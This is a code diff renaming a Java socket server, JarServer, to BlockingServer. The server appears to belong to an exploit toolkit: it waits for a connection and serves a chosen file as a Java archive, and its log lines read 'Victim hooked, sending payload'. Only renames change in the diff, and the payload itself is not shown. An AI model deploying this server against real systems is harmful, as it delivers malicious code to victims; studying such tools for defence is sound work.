@@ -2,28 +2,28 @@ import java.net.*;
 import java.io.*;
 import java.util.*;
 
-public class JarServer {
+public class BlockingServer {
   int port;
-  String jarPath;
+  String path;
   Socket con;
   BufferedReader in;
   OutputStream out;
   PrintStream pout;
 
-  public JarServer(int port, String path) {
+  public BlockingServer(int port, String path) {
     this.port = port;
-    this.jarPath = path;
+    this.path = path;
   }
 
   public static void main(String[] args) {
     if (args.length!=2) {
-      System.out.println("[+] Usage: java JarServer <port> <file to send>");
+      System.out.println("[+] Usage: java BlockingServer <port> <file to send>");
       System.exit(-1);
     }
     int port = Integer.parseInt(args[0]);
-    String jarPath = args[1];
+    String path = args[1];
 
-    JarServer js = new JarServer(port, jarPath);
+    BlockingServer js = new BlockingServer(port, path);
     js.run();
   }
 
@@ -37,7 +37,7 @@ public class JarServer {
     }
 
     while (true) {
-      System.out.println("[+] JarServer worker accepting connections on port "+ port);
+      System.out.println("[+] BlockingServer accepting connections on port "+ port);
       try {
         con = ss.accept();
         in = new BufferedReader(new InputStreamReader(con.getInputStream()));
@@ -77,14 +77,14 @@ public class JarServer {
       System.out.println("[+] Bad request. Exiting");
       System.exit(-1);
     } else {
-      File f = new File(jarPath);
+      File f = new File(path);
       try { 
         System.out.println("[+] Victim hooked, sending payload");
         InputStream file = new FileInputStream(f);
         String contenttype = "application/java-archive";
         pout.print("HTTP/1.0 200 OK\r\n");
         if (contenttype!=null) pout.print("Content-Type: "+contenttype+"\r\n");
-        pout.print("Date: "+new Date()+"\r\n"+ "Server: JarServer 1.0\r\n\r\n");
+        pout.print("Date: "+new Date()+"\r\n"+ "Server: BlockingServer 1.0\r\n\r\n");
         byte[] buffer = new byte[1000];
         while (file.available()>0) out.write(buffer, 0, file.read(buffer));
       } catch (FileNotFoundException e) { 
